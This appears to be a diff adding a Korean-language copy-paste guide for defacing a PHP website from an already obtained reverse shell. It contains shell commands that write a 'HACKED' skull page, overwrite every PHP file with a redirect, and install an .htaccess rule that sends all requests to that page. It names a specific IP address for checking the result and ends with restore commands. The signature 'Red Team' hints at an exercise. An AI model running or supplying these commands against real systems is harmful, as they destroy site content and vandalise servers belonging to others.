@@ -1,0 +1,63 @@
+============================================================
+💀 직접 Defacement 명령어 (리버스 쉘에서 실행)
+============================================================
+
+리버스 쉘에 접속한 후 아래 명령어를 순서대로 복사/붙여넣기:
+
+============================================================
+Step 1: hacked.html 생성
+============================================================
+cat > /var/www/html/hacked.html << 'EOF'
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>HACKED</title><style>*{margin:0;padding:0}body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.skull{font-size:10px;line-height:1;white-space:pre}h1{font-size:3em;color:#f00;animation:b .5s infinite}@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style></head><body><div><div class="skull">    _.--""-._
+ ."         ".
+/             \
+|,  .-.  .-.  ,|
+| )(__/  \__)( |
+|/     /\     \|
+(_     ^^     _)
+ \____________/</div><h1>HACKED</h1><p style="margin:20px 0">SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style="margin-top:20px">-- Red Team --</p></div></body></html>
+EOF
+
+============================================================
+Step 2: PHP 파일 백업
+============================================================
+find /var/www/html -name "*.php" -type f -exec cp {} {}.bak \;
+
+============================================================
+Step 3: 모든 PHP 파일에 리다이렉트 주입
+============================================================
+find /var/www/html -name "*.php" -type f -exec sh -c 'echo "<?php header(\"Location: /hacked.html\"); exit; ?>" > "$1"' _ {} \;
+
+============================================================
+Step 4: .htaccess 생성 (모든 요청 리다이렉트)
+============================================================
+cat > /var/www/html/.htaccess << 'EOF'
+RewriteEngine On
+RewriteCond %{REQUEST_URI} !^/hacked\.html$
+RewriteRule ^(.*)$ /hacked.html [L,R=302]
+EOF
+
+============================================================
+확인:
+============================================================
+http://52.78.221.104/
+http://52.78.221.104/login.php
+http://52.78.221.104/profile.php
+http://52.78.221.104/index.php
+http://52.78.221.104/anything
+
+→ 모든 URL에서 해골 화면이 보여야 합니다!
+
+============================================================
+복구 (나중에 필요시):
+============================================================
+# .htaccess 삭제
+rm /var/www/html/.htaccess
+
+# hacked.html 삭제
+rm /var/www/html/hacked.html
+
+# PHP 파일 복구
+find /var/www/html -name "*.php.bak" -type f -exec sh -c 'mv "$1" "${1%.bak}"' _ {} \;
+
+============================================================
